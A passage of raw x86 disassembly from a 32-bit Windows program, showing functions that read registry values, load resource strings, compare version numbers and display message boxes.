  40a70d:	push   0xdf
  40a712:	push   DWORD PTR [ebp-0x1c80]
  40a718:	call   DWORD PTR ds:0x414188
  40a71e:	push   ebx
  40a71f:	lea    eax,[ebp-0xa38]
  40a725:	push   eax
  40a726:	push   0x900
  40a72b:	push   esi
  40a72c:	push   esi
  40a72d:	lea    eax,[ebp-0x418]
  40a733:	push   edi
  40a734:	push   eax
  40a735:	call   0x410f98
  40a73a:	add    esp,0x1c
  40a73d:	jmp    0x40a5ee
  40a742:	mov    edi,0x209
  40a747:	cmp    DWORD PTR [ebp+0x14],esi
  40a74a:	jne    0x40a79a
  40a74c:	push   edi
  40a74d:	lea    eax,[ebp-0xa38]
  40a753:	push   eax
  40a754:	push   0xde
  40a759:	push   DWORD PTR [ebp-0x1c80]
  40a75f:	call   DWORD PTR ds:0x414188
  40a765:	push   ebx
  40a766:	lea    eax,[ebp-0xa38]
  40a76c:	push   eax
  40a76d:	push   0x900
  40a772:	push   esi
  40a773:	push   esi
  40a774:	lea    eax,[ebp-0x418]
  40a77a:	push   edi
  40a77b:	push   eax
  40a77c:	call   0x410f98
  40a781:	add    esp,0x1c
  40a784:	lea    eax,[ebp-0x418]
  40a78a:	push   0x41004
  40a78f:	push   ebx
  40a790:	push   eax
  40a791:	push   esi
  40a792:	call   DWORD PTR ds:0x414168
  40a798:	jmp    0x40a79d
  40a79a:	push   0x6
  40a79c:	pop    eax
  40a79d:	cmp    eax,0x6
  40a7a0:	jne    0x40a5fe
  40a7a6:	mov    ecx,DWORD PTR [ebp-0x1c8c]
  40a7ac:	lea    eax,[ebp-0xc44]
  40a7b2:	push   eax
  40a7b3:	lea    edx,[ebp-0x624]
  40a7b9:	call   0x409fd3
  40a7be:	test   eax,eax
  40a7c0:	je     0x40a5fe
  40a7c6:	lea    eax,[ebp-0x624]
  40a7cc:	push   eax
  40a7cd:	lea    ecx,[ebp-0x1460]
  40a7d3:	call   0x40eb66
  40a7d8:	push   0x104
  40a7dd:	lea    eax,[ebp-0xa38]
  40a7e3:	push   eax
  40a7e4:	call   DWORD PTR ds:0x41409c
  40a7ea:	test   eax,eax
  40a7ec:	je     0x40a898
  40a7f2:	lea    eax,[ebp-0x104a]
  40a7f8:	mov    ebx,0x900
  40a7fd:	push   eax
  40a7fe:	lea    eax,[ebp-0xa38]
  40a804:	push   eax
  40a805:	push   0x402ed8
  40a80a:	push   ebx
  40a80b:	push   esi
  40a80c:	push   esi
  40a80d:	lea    eax,[ebp-0x418]
  40a813:	push   edi
  40a814:	push   eax
  40a815:	call   0x410f98
  40a81a:	add    esp,0x20
  40a81d:	test   eax,eax
  40a81f:	js     0x40a830
  40a821:	lea    ecx,[ebp-0x418]
  40a827:	call   0x410767
  40a82c:	test   eax,eax
  40a82e:	jne    0x40a871
  40a830:	lea    eax,[ebp-0x104a]
  40a836:	push   eax
  40a837:	push   eax
  40a838:	lea    eax,[ebp-0x124c]
  40a83e:	push   eax
  40a83f:	lea    eax,[ebp-0x1256]
  40a845:	push   eax
  40a846:	push   0x402eec
  40a84b:	push   ebx
  40a84c:	push   esi
  40a84d:	push   esi
  40a84e:	lea    eax,[ebp-0x418]
  40a854:	push   edi
  40a855:	push   eax
  40a856:	call   0x410f98
  40a85b:	add    esp,0x28
  40a85e:	test   eax,eax
  40a860:	js     0x40a88d
  40a862:	lea    ecx,[ebp-0x418]
  40a868:	call   0x410767
  40a86d:	test   eax,eax
  40a86f:	je     0x40a88d
  40a871:	push   ebx
  40a872:	push   ecx
  40a873:	push   ecx
  40a874:	mov    ecx,DWORD PTR [ebp-0x1c88]
  40a87a:	lea    eax,[ebp-0x418]
  40a880:	push   eax
  40a881:	mov    edx,0x105
  40a886:	call   0x410ebe
  40a88b:	jmp    0x40a898
  40a88d:	mov    eax,DWORD PTR [ebp-0x1c88]
  40a893:	xor    ecx,ecx
  40a895:	mov    WORD PTR [eax],cx
  40a898:	xor    esi,esi
  40a89a:	inc    esi
  40a89b:	jmp    0x40a601
  40a8a0:	call   0x411ad9
  40a8a5:	int3   
  40a8a6:	int3   
  40a8a7:	int3   
  40a8a8:	int3   
  40a8a9:	int3   
  40a8aa:	int3   
  40a8ab:	mov    edi,edi
  40a8ad:	push   ebp
  40a8ae:	mov    ebp,esp
  40a8b0:	sub    esp,0xa40
  40a8b6:	mov    eax,ds:0x413004
  40a8bb:	xor    eax,ebp
  40a8bd:	mov    DWORD PTR [ebp-0x4],eax
  40a8c0:	mov    eax,DWORD PTR [ebp+0x8]
  40a8c3:	and    DWORD PTR [ebp-0xa30],0x0
  40a8ca:	push   ebx
  40a8cb:	push   esi
  40a8cc:	push   edi
  40a8cd:	mov    DWORD PTR [ebp-0xa40],eax
  40a8d3:	xor    esi,esi
  40a8d5:	lea    eax,[ebp-0xa30]
  40a8db:	mov    ebx,edx
  40a8dd:	push   eax
  40a8de:	push   0x20019
  40a8e3:	push   0x0
  40a8e5:	push   0x4010e8
  40a8ea:	push   0x80000002
  40a8ef:	mov    edi,ecx
  40a8f1:	inc    esi
  40a8f2:	call   DWORD PTR ds:0x414004
  40a8f8:	test   eax,eax
  40a8fa:	jne    0x40aa35
  40a900:	and    DWORD PTR [ebp-0xa3c],eax
  40a906:	lea    eax,[ebp-0xa38]
  40a90c:	push   eax
  40a90d:	lea    eax,[ebp-0xa34]
  40a913:	mov    DWORD PTR [ebp-0xa38],0x4
  40a91d:	push   eax
  40a91e:	lea    eax,[ebp-0xa3c]
  40a924:	push   eax
  40a925:	push   0x0
  40a927:	push   0x402f54
  40a92c:	push   DWORD PTR [ebp-0xa30]
  40a932:	call   DWORD PTR ds:0x414000
  40a938:	test   eax,eax
  40a93a:	jne    0x40a9b5
  40a93c:	push   DWORD PTR [ebp-0xa40]
  40a942:	lea    ecx,[ebp-0xa2c]
  40a948:	call   0x40eb66
  40a94d:	push   0x401578
  40a952:	lea    eax,[ebp-0x616]
  40a958:	push   eax
  40a959:	lea    eax,[ebp-0x818]
  40a95f:	push   eax
  40a960:	lea    eax,[ebp-0x822]
  40a966:	push   eax
  40a967:	push   0x401748
  40a96c:	push   0x900
  40a971:	push   0x0
  40a973:	push   0x0
  40a975:	lea    eax,[ebp-0x210]
  40a97b:	push   0x105
  40a980:	push   eax
  40a981:	call   0x410f98
  40a986:	add    esp,0x28
  40a989:	test   eax,eax
  40a98b:	jns    0x40a994
  40a98d:	xor    esi,esi
  40a98f:	jmp    0x40aa35
  40a994:	lea    eax,[ebp-0x210]
  40a99a:	push   eax
  40a99b:	push   0xffffffff
  40a99d:	push   0x402860
  40a9a2:	push   0x4028d4
  40a9a7:	call   DWORD PTR ds:0x414070
  40a9ad:	cmp    DWORD PTR [ebp-0xa34],eax
  40a9b3:	ja     0x40a98d
  40a9b5:	lea    eax,[ebp-0xa38]
  40a9bb:	mov    DWORD PTR [ebp-0xa38],0x4
  40a9c5:	push   eax
  40a9c6:	lea    eax,[ebp-0xa34]
  40a9cc:	push   eax
  40a9cd:	lea    eax,[ebp-0xa3c]
  40a9d3:	push   eax
  40a9d4:	push   0x0
  40a9d6:	push   0x402f08
  40a9db:	push   DWORD PTR [ebp-0xa30]
  40a9e1:	call   DWORD PTR ds:0x414000
  40a9e7:	test   eax,eax
  40a9e9:	jne    0x40a9f3
  40a9eb:	cmp    DWORD PTR [ebp-0xa34],edi
  40a9f1:	ja     0x40a98d
  40a9f3:	lea    eax,[ebp-0xa38]
  40a9f9:	mov    DWORD PTR [ebp-0xa38],0x4
  40aa03:	push   eax
  40aa04:	lea    eax,[ebp-0xa34]
  40aa0a:	push   eax
  40aa0b:	lea    eax,[ebp-0xa3c]
  40aa11:	push   eax
  40aa12:	push   0x0
  40aa14:	push   0x402f2c
  40aa19:	push   DWORD PTR [ebp-0xa30]
  40aa1f:	call   DWORD PTR ds:0x414000
  40aa25:	test   eax,eax
  40aa27:	jne    0x40aa35
  40aa29:	cmp    ebx,DWORD PTR [ebp-0xa34]
  40aa2f:	sbb    eax,eax
  40aa31:	not    eax
  40aa33:	and    esi,eax
  40aa35:	cmp    DWORD PTR [ebp-0xa30],0x0
  40aa3c:	je     0x40aa4a
  40aa3e:	push   DWORD PTR [ebp-0xa30]
  40aa44:	call   DWORD PTR ds:0x414008
  40aa4a:	mov    ecx,DWORD PTR [ebp-0x4]
  40aa4d:	mov    eax,esi
  40aa4f:	pop    edi
  40aa50:	pop    esi
  40aa51:	xor    ecx,ebp
  40aa53:	pop    ebx
  40aa54:	call   0x411980
  40aa59:	mov    esp,ebp
  40aa5b:	pop    ebp
  40aa5c:	ret    0x4
  40aa5f:	int3   
  40aa60:	int3   
  40aa61:	int3   
  40aa62:	int3   
  40aa63:	int3   
  40aa64:	mov    edi,edi
  40aa66:	push   ebx
  40aa67:	push   esi
  40aa68:	push   edi
  40aa69:	push   0x0
  40aa6b:	push   0x0
  40aa6d:	mov    esi,0x8000ffff
  40aa72:	call   DWORD PTR ds:0x414098
  40aa78:	mov    edi,eax
  40aa7a:	test   edi,edi
  40aa7c:	je     0x40ab1d
  40aa82:	push   0x402f80
  40aa87:	call   DWORD PTR ds:0x414094
  40aa8d:	add    edi,eax
  40aa8f:	lea    eax,[edi+0x1]
  40aa92:	push   eax
  40aa93:	call   DWORD PTR ds:0x4141b0
  40aa99:	mov    ebx,eax
  40aa9b:	test   ebx,ebx
  40aa9d:	je     0x40ab18
  40aa9f:	push   edi
  40aaa0:	push   ebx
  40aaa1:	call   DWORD PTR ds:0x414098
  40aaa7:	test   eax,eax
  40aaa9:	je     0x40ab0f
  40aaab:	sub    esp,0x10
  40aaae:	lea    edx,[edi+0x1]
  40aab1:	mov    ecx,ebx
  40aab3:	call   0x410f68
  40aab8:	push   ebx
  40aab9:	mov    esi,eax
  40aabb:	call   DWORD PTR ds:0x4141a8
  40aac1:	mov    edi,eax
  40aac3:	test   esi,esi
  40aac5:	js     0x40ab05
  40aac7:	test   edi,edi
  40aac9:	je     0x40ab05
  40aacb:	mov    ecx,edi
  40aacd:	call   0x410767
  40aad2:	test   eax,eax
  40aad4:	je     0x40ab05
  40aad6:	mov    ecx,DWORD PTR ds:0x4136c0
  40aadc:	mov    edx,edi
  40aade:	push   0x100
  40aae3:	push   0x402d44
  40aae8:	call   0x410123
  40aaed:	mov    esi,eax
  40aaef:	push   esi
  40aaf0:	push   0x402f98
  40aaf5:	push   DWORD PTR ds:0x4130e8
  40aafb:	call   0x40e818
  40ab00:	add    esp,0xc
  40ab03:	jmp    0x40ab08
  40ab05:	xor    esi,esi
  40ab07:	inc    esi
  40ab08:	push   edi
  40ab09:	call   DWORD PTR ds:0x4141bc
  40ab0f:	push   ebx
  40ab10:	call   DWORD PTR ds:0x4141bc
  40ab16:	jmp    0x40ab1d
  40ab18:	mov    esi,0x8007000e
  40ab1d:	pop    edi
  40ab1e:	mov    eax,esi
  40ab20:	pop    esi
  40ab21:	pop    ebx
  40ab22:	ret    
  40ab23:	int3   
  40ab24:	int3   
  40ab25:	int3   
  40ab26:	int3   
  40ab27:	int3   
  40ab28:	mov    edi,edi
  40ab2a:	push   ebp
  40ab2b:	mov    ebp,esp
  40ab2d:	mov    eax,0x1e38
  40ab32:	call   0x412030
  40ab37:	mov    eax,ds:0x413004
  40ab3c:	xor    eax,ebp
  40ab3e:	mov    DWORD PTR [ebp-0x8],eax
  40ab41:	mov    eax,DWORD PTR [ebp+0x8]
  40ab44:	push   ebx
  40ab45:	mov    ebx,DWORD PTR [ebp+0xc]
  40ab48:	push   esi
  40ab49:	mov    DWORD PTR [ebp-0x1e24],ecx
  40ab4f:	lea    ecx,[ebp-0x11d4]
  40ab55:	mov    DWORD PTR [ebp-0x1e34],eax
  40ab5b:	mov    eax,DWORD PTR [ebp+0x14]
  40ab5e:	push   edi
  40ab5f:	mov    DWORD PTR [ebp-0x1e28],edx
  40ab65:	mov    DWORD PTR [ebp-0x1e30],ebx
  40ab6b:	mov    DWORD PTR [ebp-0x1e20],eax
  40ab71:	call   0x4107b7
  40ab76:	lea    ecx,[ebp-0xb8c]
  40ab7c:	call   0x40fa55
  40ab81:	lea    ecx,[ebp-0xb8c]
  40ab87:	call   0x40fade
  40ab8c:	xor    edi,edi
  40ab8e:	test   eax,eax
  40ab90:	je     0x40abad
  40ab92:	push   ebx
  40ab93:	push   edi
  40ab94:	push   0x40307c
  40ab99:	push   0x4028a4
  40ab9e:	call   DWORD PTR ds:0x414070
  40aba4:	mov    esi,eax
  40aba6:	neg    esi
  40aba8:	sbb    esi,esi
  40abaa:	inc    esi
  40abab:	jmp    0x40abb0
  40abad:	xor    esi,esi
  40abaf:	inc    esi
  40abb0:	push   ebx
  40abb1:	push   0x28000000
  40abb6:	push   0x402964
  40abbb:	push   0x402948
  40abc0:	call   DWORD PTR ds:0x414070
  40abc6:	push   ebx
  40abc7:	push   0x70002
  40abcc:	push   0x402860
  40abd1:	push   0x402948
  40abd6:	mov    DWORD PTR [ebp-0x1e2c],eax
  40abdc:	call   DWORD PTR ds:0x414070
  40abe2:	push   DWORD PTR [ebp-0x1e30]
  40abe8:	mov    edx,DWORD PTR [ebp-0x1e2c]
  40abee:	mov    ebx,eax
  40abf0:	mov    ecx,ebx
  40abf2:	call   0x40a8ab
  40abf7:	test   eax,eax
  40abf9:	jne    0x40ac29
  40abfb:	cmp    DWORD PTR [ebp+0x18],edi
  40abfe:	jne    0x40afb2
  40ac04:	mov    esi,DWORD PTR [ebp-0x1e24]
  40ac0a:	lea    eax,[ebp-0x424]
  40ac10:	push   0x209
  40ac15:	push   eax
  40ac16:	push   0xe7
  40ac1b:	push   esi
  40ac1c:	call   DWORD PTR ds:0x414188
  40ac22:	push   0x10
  40ac24:	jmp    0x40ae42
  40ac29:	call   0x408508
  40ac2e:	mov    ecx,DWORD PTR [ebp-0x1e34]
  40ac34:	mov    DWORD PTR [ecx],eax
  40ac36:	cmp    DWORD PTR [ebp-0xfbc],edi
  40ac3c:	je     0x40af07
  40ac42:	cmp    ebx,DWORD PTR [ebp-0xfc8]
  40ac48:	jb     0x40ac77
  40ac4a:	mov    eax,DWORD PTR [ebp-0xfc4]
  40ac50:	mov    ecx,DWORD PTR [ebp-0x1e2c]
  40ac56:	cmp    ecx,eax
  40ac58:	jb     0x40ac77
  40ac5a:	test   esi,esi
  40ac5c:	je     0x40ad06
  40ac62:	cmp    ebx,DWORD PTR [ebp-0xfc8]
  40ac68:	jne    0x40ac84
  40ac6a:	shr    eax,0x10
  40ac6d:	mov    edx,0x992
  40ac72:	cmp    ax,dx
  40ac75:	jbe    0x40ac84
  40ac77:	mov    ecx,DWORD PTR [ebp-0x1e28]
  40ac7d:	mov    DWORD PTR [ecx],edi
  40ac7f:	jmp    0x40af46
  40ac84:	movzx  eax,cx
  40ac87:	push   eax
  40ac88:	shr    ecx,0x10
  40ac8b:	push   ecx
  40ac8c:	movzx  eax,bx
  40ac8f:	push   eax
  40ac90:	shr    ebx,0x10
  40ac93:	lea    eax,[ebp-0x634]
  40ac99:	push   ebx
  40ac9a:	push   0x403098
  40ac9f:	push   0x900
  40aca4:	push   edi
  40aca5:	push   edi
  40aca6:	push   0x105
  40acab:	push   eax
  40acac:	call   0x410f98
  40acb1:	add    esp,0x28
  40acb4:	cmp    DWORD PTR [ebp+0x18],edi
  40acb7:	jne    0x40afb2
  40acbd:	mov    esi,DWORD PTR [ebp-0x1e24]
  40acc3:	lea    eax,[ebp-0xa4c]
  40acc9:	mov    ebx,0x209
  40acce:	push   ebx
  40accf:	push   eax
  40acd0:	push   0xd8
  40acd5:	push   esi
  40acd6:	call   DWORD PTR ds:0x414188
  40acdc:	lea    eax,[ebp-0x634]
  40ace2:	push   eax
  40ace3:	lea    eax,[ebp-0xa4c]
  40ace9:	push   eax
  40acea:	push   0x900
  40acef:	push   edi
  40acf0:	push   edi
  40acf1:	lea    eax,[ebp-0x424]
  40acf7:	push   ebx
  40acf8:	push   eax
  40acf9:	call   0x410f98
  40acfe:	add    esp,0x1c
  40ad01:	jmp    0x40af32
  40ad06:	cmp    ebx,DWORD PTR [ebp-0xfc8]
  40ad0c:	jne    0x40ad2f
  40ad0e:	cmp    ecx,eax
  40ad10:	jne    0x40ad2f
  40ad12:	lea    ecx,[ebp-0xb8c]
  40ad18:	call   0x40fade
  40ad1d:	mov    ecx,DWORD PTR [ebp-0x1e28]
  40ad23:	neg    eax
  40ad25:	sbb    eax,eax
  40ad27:	inc    eax
  40ad28:	mov    DWORD PTR [ecx],eax
  40ad2a:	jmp    0x40af46
  40ad2f:	lea    ecx,[ebp-0xb8c]
  40ad35:	call   0x40fade
  40ad3a:	test   eax,eax
  40ad3c:	je     0x40ad66
  40ad3e:	call   0x408fdb
  40ad43:	test   eax,eax
  40ad45:	jne    0x40ad66
  40ad47:	cmp    DWORD PTR [ebp+0x18],edi
  40ad4a:	jne    0x40afb2
  40ad50:	push   0x208
  40ad55:	lea    eax,[ebp-0x424]
  40ad5b:	push   eax
  40ad5c:	push   0xeb
  40ad61:	jmp    0x40ae33
  40ad66:	lea    ecx,[ebp-0xb8c]
  40ad6c:	call   0x40fade
  40ad71:	test   eax,eax
  40ad73:	je     0x40ae4d
  40ad79:	push   DWORD PTR [ebp-0x1e30]
  40ad7f:	lea    ecx,[ebp-0x1e1c]
  40ad85:	call   0x40eb66
  40ad8a:	mov    ebx,0x4030b0
  40ad8f:	push   ebx
  40ad90:	call   DWORD PTR ds:0x414068
  40ad96:	mov    esi,eax
  40ad98:	lea    eax,[ebp-0x1c08]
  40ad9e:	push   eax
  40ad9f:	call   DWORD PTR ds:0x414068
  40ada5:	add    esi,eax
  40ada7:	lea    eax,[ebp-0x1c12]
  40adad:	push   eax
  40adae:	call   DWORD PTR ds:0x414068
  40adb4:	add    eax,esi
  40adb6:	cmp    eax,0x104
  40adbb:	ja     0x40ae4d
  40adc1:	push   ebx
  40adc2:	lea    eax,[ebp-0x1c08]
  40adc8:	push   eax
  40adc9:	lea    eax,[ebp-0x1c12]
  40adcf:	push   eax
  40add0:	push   0x4015e8
  40add5:	push   0x900
  40adda:	push   edi
  40addb:	push   edi
  40addc:	lea    eax,[ebp-0xa4c]
  40ade2:	push   0x209
  40ade7:	push   eax
  40ade8:	call   0x410f98
  40aded:	add    esp,0x24
  40adf0:	test   eax,eax
  40adf2:	js     0x40ae4d
  40adf4:	lea    eax,[ebp-0xa4c]
  40adfa:	push   eax
  40adfb:	lea    ecx,[ebp-0xdac]
  40ae01:	call   0x4104d1
  40ae06:	mov    eax,DWORD PTR [ebp-0xb98]
  40ae0c:	xor    eax,DWORD PTR [ebp-0xfc0]
  40ae12:	test   eax,0x3ff
  40ae17:	je     0x40ae4d
  40ae19:	cmp    DWORD PTR [ebp+0x18],edi
  40ae1c:	jne    0x40afb2
  40ae22:	push   0x208
  40ae27:	lea    eax,[ebp-0x424]
  40ae2d:	push   eax
  40ae2e:	push   0xed
  40ae33:	mov    esi,DWORD PTR [ebp-0x1e24]
  40ae39:	push   esi
  40ae3a:	call   DWORD PTR ds:0x414188
  40ae40:	push   0x30
  40ae42:	mov    ebx,DWORD PTR [ebp-0x1e20]
  40ae48:	jmp    0x40af9e
  40ae4d:	lea    ecx,[ebp-0x15fc]
  40ae53:	call   0x41060e
  40ae58:	cmp    DWORD PTR [ebp-0x13e4],edi
  40ae5e:	je     0x40aeed
  40ae64:	cmp    DWORD PTR [ebp-0x13f0],0x70000
  40ae6e:	mov    eax,DWORD PTR [ebp-0x13ec]
  40ae74:	je     0x40ae82
  40ae76:	cmp    DWORD PTR [ebp-0x13f0],0x60000
  40ae80:	jne    0x40ae89
  40ae82:	cmp    eax,0x75e0000
  40ae87:	ja     0x40aea1
  40ae89:	cmp    DWORD PTR [ebp-0x13f0],0x70001
  40ae93:	jne    0x40aeed
  40ae95:	add    eax,0xf7fe0000
  40ae9a:	cmp    eax,0x910000
  40ae9f:	ja     0x40aeed
  40aea1:	cmp    DWORD PTR [ebp+0x18],edi
  40aea4:	jne    0x40afb2
  40aeaa:	mov    esi,DWORD PTR [ebp-0x1e24]
  40aeb0:	lea    eax,[ebp-0x424]
  40aeb6:	push   0x208
  40aebb:	push   eax
  40aebc:	push   0xda
  40aec1:	push   esi
  40aec2:	call   DWORD PTR ds:0x414188
  40aec8:	mov    ebx,DWORD PTR [ebp-0x1e20]
  40aece:	lea    eax,[ebp-0x424]
  40aed4:	push   0x134
  40aed9:	push   ebx
  40aeda:	push   eax
  40aedb:	push   edi
  40aedc:	call   DWORD PTR ds:0x414168
  40aee2:	cmp    eax,0x7
  40aee5:	je     0x40afb2
  40aeeb:	jmp    0x40aef9
  40aeed:	mov    esi,DWORD PTR [ebp-0x1e24]
  40aef3:	mov    ebx,DWORD PTR [ebp-0x1e20]
  40aef9:	mov    ecx,DWORD PTR [ebp-0x1e28]
  40aeff:	mov    DWORD PTR [ecx],0x1
  40af05:	jmp    0x40af52
  40af07:	test   esi,esi
  40af09:	je     0x40af3a
  40af0b:	cmp    DWORD PTR [ebp+0x18],edi
  40af0e:	jne    0x40afb2
  40af14:	mov    esi,DWORD PTR [ebp-0x1e24]
  40af1a:	lea    eax,[ebp-0x424]
  40af20:	push   0x104
  40af25:	push   eax
  40af26:	push   0xd0
  40af2b:	push   esi
  40af2c:	call   DWORD PTR ds:0x414188
  40af32:	mov    ebx,DWORD PTR [ebp-0x1e20]
  40af38:	jmp    0x40af9d
  40af3a:	mov    ecx,DWORD PTR [ebp-0x1e28]
  40af40:	mov    DWORD PTR [ecx],0x1
  40af46:	mov    ebx,DWORD PTR [ebp-0x1e20]
  40af4c:	mov    esi,DWORD PTR [ebp-0x1e24]
  40af52:	cmp    DWORD PTR [ebp+0x10],edi
  40af55:	jne    0x40afaf
  40af57:	push   0x104
  40af5c:	lea    eax,[ebp-0xd9c]
  40af62:	push   eax
  40af63:	call   DWORD PTR ds:0x41409c
  40af69:	test   eax,eax
  40af6b:	je     0x40af7a
  40af6d:	lea    ecx,[ebp-0xd9c]
  40af73:	call   0x4098fb
  40af78:	jmp    0x40af7c
  40af7a:	mov    eax,edi
  40af7c:	test   eax,eax
  40af7e:	jne    0x40afaf
  40af80:	cmp    DWORD PTR [ebp+0x18],edi
  40af83:	jne    0x40afb2
  40af85:	push   0x209
  40af8a:	lea    eax,[ebp-0x424]
  40af90:	push   eax
  40af91:	push   0xcf
  40af96:	push   esi
  40af97:	call   DWORD PTR ds:0x414188
  40af9d:	push   edi
  40af9e:	push   ebx
  40af9f:	lea    eax,[ebp-0x424]
  40afa5:	push   eax
  40afa6:	push   edi
  40afa7:	call   DWORD PTR ds:0x414168
  40afad:	jmp    0x40afb2
  40afaf:	xor    edi,edi
  40afb1:	inc    edi
  40afb2:	mov    ecx,DWORD PTR [ebp-0x8]
  40afb5:	mov    eax,edi
  40afb7:	pop    edi
  40afb8:	pop    esi
  40afb9:	xor    ecx,ebp
  40afbb:	pop    ebx
  40afbc:	call   0x411980
  40afc1:	mov    esp,ebp
  40afc3:	pop    ebp
  40afc4:	ret    0x14
  40afc7:	int3   
  40afc8:	int3   
  40afc9:	int3   
  40afca:	int3   
  40afcb:	int3   
  40afcc:	mov    edi,edi
  40afce:	push   ebp
  40afcf:	mov    ebp,esp
  40afd1:	sub    esp,0x10
  40afd4:	cmp    DWORD PTR [ebp+0x18],0x0
  40afd8:	push   ebx
  40afd9:	push   esi
  40afda:	push   edi
  40afdb:	mov    ebx,edx
  40afdd:	mov    DWORD PTR [ebp-0x4],ecx
  40afe0:	je     0x40b01a
  40afe2:	mov    eax,DWORD PTR [ebp+0x8]
  40afe5:	xor    ecx,ecx
  40afe7:	cmp    DWORD PTR [ebp+0x10],ecx
  40afea:	sete   cl
  40afed:	mov    DWORD PTR [eax],ecx
  40afef:	call   0x408fdb
  40aff4:	test   eax,eax
  40aff6:	je     0x40b012
  40aff8:	cmp    DWORD PTR [ebp+0x14],0x0
  40affc:	jne    0x40b012
  40affe:	call   0x40916c
  40b003:	test   eax,eax
  40b005:	je     0x40b012
  40b007:	mov    DWORD PTR [ebx],0x1
  40b00d:	jmp    0x40b0b7
  40b012:	and    DWORD PTR [ebx],0x0
  40b015:	jmp    0x40b0b7
  40b01a:	call   0x408fdb
  40b01f:	mov    esi,DWORD PTR [ebp+0xc]
  40b022:	test   eax,eax
  40b024:	je     0x40b03e
  40b026:	test   esi,esi
  40b028:	je     0x40b03a
  40b02a:	call   0x40916c
  40b02f:	test   eax,eax
  40b031:	jne    0x40b058
  40b033:	xor    eax,eax
  40b035:	jmp    0x40b0ba
  40b03a:	push   0x67
  40b03c:	jmp    0x40b05a
  40b03e:	test   esi,esi
  40b040:	jne    0x40b033
  40b042:	call   DWORD PTR ds:0x4141ac
  40b048:	cmp    eax,0x2
  40b04b:	jne    0x40b058
  40b04d:	call   DWORD PTR ds:0x4141b4
  40b053:	cmp    eax,0x6
  40b056:	jae    0x40b03a
  40b058:	push   0x68
  40b05a:	mov    eax,DWORD PTR [ebp+0x1c]
  40b05d:	mov    DWORD PTR [ebp-0x10],eax
  40b060:	mov    eax,DWORD PTR [ebp+0x10]
  40b063:	mov    DWORD PTR [ebp-0xc],eax
  40b066:	mov    eax,DWORD PTR [ebp+0x14]
  40b069:	mov    DWORD PTR [ebp-0x8],eax
  40b06c:	pop    edi
  40b06d:	test   eax,eax
  40b06f:	jne    0x40b081
  40b071:	call   0x40916c
  40b076:	test   eax,eax
  40b078:	jne    0x40b081
  40b07a:	mov    DWORD PTR [ebp-0x8],0x1
  40b081:	lea    eax,[ebp-0x10]
  40b084:	push   eax
  40b085:	push   0x409b70
  40b08a:	push   0x0
  40b08c:	movzx  eax,di
  40b08f:	push   eax
  40b090:	push   DWORD PTR [ebp-0x4]
  40b093:	call   DWORD PTR ds:0x414164
  40b099:	cmp    eax,0xffffffff
  40b09c:	je     0x40b033
  40b09e:	test   al,0x1
  40b0a0:	jne    0x40b0aa
  40b0a2:	test   esi,esi
  40b0a4:	jne    0x40b0aa
  40b0a6:	xor    ecx,ecx
  40b0a8:	jmp    0x40b0ad
  40b0aa:	xor    ecx,ecx
  40b0ac:	inc    ecx
  40b0ad:	mov    DWORD PTR [ebx],ecx
  40b0af:	and    eax,0x10
  40b0b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40b0b5:	mov    DWORD PTR [ecx],eax
  40b0b7:	xor    eax,eax
  40b0b9:	inc    eax
  40b0ba:	pop    edi
  40b0bb:	pop    esi
  40b0bc:	pop    ebx
  40b0bd:	mov    esp,ebp
  40b0bf:	pop    ebp
  40b0c0:	ret    0x18
  40b0c3:	int3   
  40b0c4:	int3   
  40b0c5:	int3   
  40b0c6:	int3   
  40b0c7:	int3   
  40b0c8:	mov    edi,edi
  40b0ca:	push   ebp
  40b0cb:	mov    ebp,esp
  40b0cd:	sub    esp,0xc44
  40b0d3:	mov    eax,ds:0x413004
  40b0d8:	xor    eax,ebp
  40b0da:	mov    DWORD PTR [ebp-0x4],eax
  40b0dd:	mov    eax,DWORD PTR [ebp+0xc]
  40b0e0:	push   ebx
  40b0e1:	push   esi
  40b0e2:	mov    esi,DWORD PTR [ebp+0x8]
  40b0e5:	mov    ebx,ecx
  40b0e7:	push   edi
  40b0e8:	mov    DWORD PTR [ebp-0xc44],eax
  40b0ee:	mov    edi,edx
  40b0f0:	xor    eax,eax
  40b0f2:	push   0x208
  40b0f7:	push   eax
  40b0f8:	mov    WORD PTR [ebp-0x210],ax
  40b0ff:	lea    eax,[ebp-0x20e]
  40b105:	push   eax
  40b106:	call   0x412060
  40b10b:	xor    eax,eax
  40b10d:	push   0x618
  40b112:	push   eax
  40b113:	mov    WORD PTR [ebp-0xc40],ax
  40b11a:	lea    eax,[ebp-0xc3e]
  40b120:	push   eax
  40b121:	call   0x412060
  40b126:	xor    eax,eax
  40b128:	push   0x410
  40b12d:	push   eax
  40b12e:	mov    WORD PTR [ebp-0x624],ax
  40b135:	lea    eax,[ebp-0x622]
  40b13b:	push   eax
  40b13c:	call   0x412060
  40b141:	add    esp,0x24
  40b144:	mov    ecx,edi
  40b146:	call   0x410767
  40b14b:	test   eax,eax
  40b14d:	je     0x40b1ef
  40b153:	push   edi
  40b154:	push   0x105
  40b159:	lea    eax,[ebp-0x210]
  40b15f:	push   eax
  40b160:	push   0x401068
  40b165:	push   0x402870
  40b16a:	push   0x401498
  40b16f:	call   DWORD PTR ds:0x414114
  40b175:	push   esi
  40b176:	lea    eax,[ebp-0x210]
  40b17c:	push   eax
  40b17d:	call   DWORD PTR ds:0x414064
  40b183:	test   eax,eax
  40b185:	je     0x40b1ef
  40b187:	cmp    DWORD PTR [ebp+0x14],0x0
  40b18b:	jne    0x40b1eb
  40b18d:	push   0x208
  40b192:	lea    eax,[ebp-0x624]
  40b198:	push   eax
  40b199:	push   0xe8
  40b19e:	push   ebx
  40b19f:	call   DWORD PTR ds:0x414188
  40b1a5:	push   DWORD PTR [ebp-0xc44]
  40b1ab:	lea    eax,[ebp-0x210]
  40b1b1:	xor    ebx,ebx
  40b1b3:	push   eax
  40b1b4:	push   esi
  40b1b5:	lea    eax,[ebp-0x624]
  40b1bb:	push   eax
  40b1bc:	push   0x900
  40b1c1:	push   ebx
  40b1c2:	push   ebx
  40b1c3:	lea    eax,[ebp-0xc40]
  40b1c9:	push   0x30d
  40b1ce:	push   eax
  40b1cf:	call   0x410f98
  40b1d4:	add    esp,0x24
  40b1d7:	lea    eax,[ebp-0xc40]
  40b1dd:	push   0x41000
  40b1e2:	push   esi
  40b1e3:	push   eax
  40b1e4:	push   ebx
  40b1e5:	call   DWORD PTR ds:0x414168
  40b1eb:	xor    eax,eax
  40b1ed:	jmp    0x40b1f2
  40b1ef:	xor    eax,eax
  40b1f1:	inc    eax
  40b1f2:	mov    ecx,DWORD PTR [ebp-0x4]
  40b1f5:	pop    edi
